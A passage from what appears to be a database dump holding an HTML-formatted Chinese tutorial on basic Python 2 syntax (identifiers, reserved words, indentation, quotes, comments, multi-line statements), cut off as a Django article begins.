Python!\r\n</pre>\r\n\r\n<p>让我们尝试另一种方式来执行Python脚本。下面是修改后的test.py文件：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">#!/usr/bin/python</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n\r\n</span><span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">print</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;Hello, Python!&quot;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">;</span></pre>\r\n\r\n<p>在这里，假设Python解释器在/usr/bin目录中可用。现在，尝试如下运行这个程序：</p>\r\n\r\n<pre>\r\n$ chmod +x test.py     # This is to make file executable\r\n$./test.py\r\n</pre>\r\n\r\n<p>这将产生以下结果：</p>\r\n\r\n<pre>\r\nHello, Python!\r\n</pre>\r\n\r\n<p>Python标识符：</p>\r\n\r\n<p>Python标识符是用来标识一个变量，函数，类，模块或其他对象的名称。一个标识符开始以字母A到Z或a〜z或后跟零个或多个字母下划线（_），下划线和数字（0〜9）。</p>\r\n\r\n<p>Python中标识符内不允许标点符号，如@，$和％。 Python是一种区分大小写的编程语言。因此，Manpower 和manpower在Python中是两个不同的标识符。</p>\r\n\r\n<p>这里有Python标识符命名约定：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>类名以大写字母以及所有其它标识符以小写字母。</p>\r\n	</li>\r\n	<li>\r\n	<p>开头单个前导下划线的标识符表示由该标识符约定意思是私有的。</p>\r\n	</li>\r\n	<li>\r\n	<p>开头两个前导下划线的标识符表示一个强烈的私有的标识符。</p>\r\n	</li>\r\n	<li>\r\n	<p>如果标识符末尾还具有两个下划线结束时，该标识符是一个语言定义的特殊名称。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>保留字：</p>\r\n\r\n<p>下面列出了在Python中的保留字。这些保留字不可以被用作常量或变量，或任何其它标识符。所有Python关键字只包含小写字母。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(0, 0, 0); font-family:helvetica,arial,sans-serif; font-size:16px; line-height:22px; margin:8px 0px; max-width:100%; padding:0px; vertical-align:top; width:560px\">\r\n	<tbody>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">and</td>\r\n			<td style=\"vertical-align:top\">exec</td>\r\n			<td style=\"vertical-align:top\">not</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">assert</td>\r\n			<td style=\"vertical-align:top\">finally</td>\r\n			<td style=\"vertical-align:top\">or</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">break</td>\r\n			<td style=\"vertical-align:top\">for</td>\r\n			<td style=\"vertical-align:top\">pass</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">class</td>\r\n			<td style=\"vertical-align:top\">from</td>\r\n			<td style=\"vertical-align:top\">print</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">continue</td>\r\n			<td style=\"vertical-align:top\">global</td>\r\n			<td style=\"vertical-align:top\">raise</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">def</td>\r\n			<td style=\"vertical-align:top\">if</td>\r\n			<td style=\"vertical-align:top\">return</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">del</td>\r\n			<td style=\"vertical-align:top\">import</td>\r\n			<td style=\"vertical-align:top\">try</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">elif</td>\r\n			<td style=\"vertical-align:top\">in</td>\r\n			<td style=\"vertical-align:top\">while</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">else</td>\r\n			<td style=\"vertical-align:top\">is</td>\r\n			<td style=\"vertical-align:top\">with</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">except</td>\r\n			<td style=\"vertical-align:top\">lambda</td>\r\n			<td style=\"vertical-align:top\">yield</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>行和缩进：</p>\r\n\r\n<p>一个程序员学习Python时，遇到的第一个需要注意的地方是，不使用括号来表示代码的类和函数定义块或流程控制。代码块是由行缩进，这是严格执行表示方式。</p>\r\n\r\n<p>在缩进位的数目是可变的，但是在块中的所有语句必须缩进相同的量。在这个例子中，两个功能块都很好使用：</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">if True:\r\n    print \"True\"\r\nelse:\r\n  print \"False\"</code></pre>\r\n\r\n<p>然而，在本实施例中的第二块将产生一个错误：</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">if True:\r\n    print \"Answer\"\r\n    print \"True\"\r\nelse:\r\n    print \"Answer\"\r\n  print \"False\"</code></pre>\r\n\r\n<p>因此，在Python中所有的连续线缩进的空格数同样的会结成块。以下是各种语句块中的例子：</p>\r\n\r\n<p>注意：不要试图理解所使用的逻辑或不同的功能。只要确定你明白，即使他们各种模块无需括号。</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">#!/usr/bin/python\r\n\r\nimport sys\r\n\r\ntry:\r\n  # open file stream\r\n  file = open(file_name, \"w\")\r\nexcept IOError:\r\n  print \"There was an error writing to\", file_name\r\n  sys.exit()\r\nprint \"Enter \'\", file_finish,\r\nprint \"\' When finished\"\r\nwhile file_text != file_finish:\r\n  file_text = raw_input(\"Enter text: \")\r\n  if file_text == file_finish:\r\n    # close the file\r\n    file.close\r\n    break\r\n  file.write(file_text)\r\n  file.write(\"\\n\")\r\nfile.close()\r\nfile_name = raw_input(\"Enter filename: \")\r\nif len(file_name) == 0:\r\n  print \"Next time please enter something\"\r\n  sys.exit()\r\ntry:\r\n  file = open(file_name, \"r\")\r\nexcept IOError:\r\n  print \"There was an error reading file\"\r\n  sys.exit()\r\nfile_text = file.read()\r\nfile.close()\r\nprint file_text</code></pre>\r\n\r\n<p>多行语句：</p>\r\n\r\n<p>Python语句通常用一个新行结束。 但是，Python允许使用续行字符（\\）来表示，该行应该继续下去（跨行）。例如：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">total </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> item_one </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">+</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> \\\r\n        item_two </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">+</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> \\\r\n        item_three</span></pre>\r\n\r\n<p>包含在[]，{}或()括号内的陈述并不需要使用续行符。例如：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">days </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">[</span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;Monday&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">,</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;Tuesday&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">,</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;Wednesday&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">,</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n        </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;Thursday&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">,</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;Friday&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">]</span></pre>\r\n\r\n<p>Python引号：</p>\r\n\r\n<p>Python接受单引号（&#39;），双引号（&ldquo;）和三（&#39;&#39;或&rdquo;&ldquo;&rdquo;）引用，以表示字符串常量，只要是同一类型的引号开始和结束的字符串。</p>\r\n\r\n<p>三重引号可以用于跨越多个行的字符串。例如，所有下列是合法的：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">word </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;word&#39;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\nsentence </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;This is a sentence.&quot;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\nparagraph </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;&quot;&quot;This is a paragraph. It is\r\nmade up of multiple lines and sentences.&quot;&quot;&quot;</span></pre>\r\n\r\n<p>Python注释：</p>\r\n\r\n<p>一个井号（＃），这不是一个字符串文字开头的注释。&ldquo;＃&rdquo;号之后字符和到物理行是注释的一部分，Python解释器会忽略它们。</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">#!/usr/bin/python</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n\r\n</span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># First comment</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n</span><span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">print</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;Hello, Python!&quot;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">  </span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># second comment</span></pre>\r\n\r\n<p>这将产生以下结果：</p>\r\n\r\n<pre>\r\nHello, Python!\r\n</pre>\r\n\r\n<p>注释可能会在声明中表达或同一行之后：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">name </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;Madisetti&quot;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># This is again comment</span></pre>\r\n\r\n<p>你可以使用多行注释如下：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># This is a comment.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n</span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># This is a comment, too.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n</span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># This is a comment, too.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n</span><span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"># I said that already.</span></pre>\r\n\r\n<p>使用空行：</p>\r\n\r\n<p>一行只含有空格，可能带有注释，如果是空行那么Python完全忽略它。</p>\r\n\r\n<p>在交互式解释器会话中，必须输入一个空的物理行终止多行语句。</p>\r\n\r\n<p>等待用户：</p>\r\n\r\n<p>程序的下面一行显示的提示，按回车键退出，等待用户按下回车键：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(136, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">#!/usr/bin/python</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">\r\n\r\nraw_input</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">(</span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;\\n\\nPress the enter key to exit.&quot;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">)</span></pre>\r\n\r\n<p>在这里，&ldquo;\\n\\n已&rdquo;被用来显示实际行之前创建两个换行。一旦用户按下键时，程序结束。这是一个很好的技巧，保持一个控制台窗口打开，直到用户完成应用程序运行。</p>\r\n\r\n<p>在一行中多个语句：</p>\r\n\r\n<p>分号( ; ) 允许在单行写入多条语句，不管语句是否启动一个新的代码块。下面是使用分号示例：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">import</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> sys</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> x </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">=</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;foo&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">;</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> sys</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">stdout</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">write</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">(</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">x </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">+</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&#39;\\n&#39;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">)</span></pre>\r\n\r\n<p>多个语句组作为套件：</p>\r\n\r\n<p>一组单独的语句，在Python单一的代码块被称为序列。复杂的语句，如if, while, def, and class，那些需要一个标题行和套件。</p>\r\n\r\n<p>标题行开始的声明（与关键字），并终止与冒号（:)），接着是一个或多个线构成该套件。例如：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">if</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> expression </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">:</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> \r\n   suite\r\n</span><span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">elif</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> expression </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">:</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> \r\n   suite \r\n</span><span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">else</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">:</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> \r\n   suite</span></pre>\r\n\r\n<p>命令行参数：</p>\r\n\r\n<p>我们可能已经看到了，比如，很多程序可以运行，它们提供有关如何运行的一些基本信息。 Python中可以使用 -h 做到这一点：</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">$ python -h\r\nusage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...\r\nOptions and arguments (and corresponding environment variables):\r\n-c cmd : program passed in as string (terminates option list)\r\n-d     : debug output from parser (also PYTHONDEBUG=x)\r\n-E     : ignore environment variables (such as PYTHONPATH)\r\n-h     : print this help message and exit</code></pre>\r\n\r\n<pre>\r\n\r\n\r\n[ etc. ]\r\n</pre>\r\n\r\n<p>您也可以设定您的脚本，它应该以这样的方式接受各种选项。&nbsp;&nbsp;命令行参数是一个高级主题并在以后学习，当您通过其它的Python概念后。</p>\r\n',0,0,'python系列教程-4-基本语法',106,NULL,0),(57,0,'20150619100548',2,'<p><strong>django是什么?</strong></p>\r\n\r\n<p><span style=\"font-family:arial,宋体,sans-serif; font-size:14px\">&nbsp; &nbsp; &nbsp; 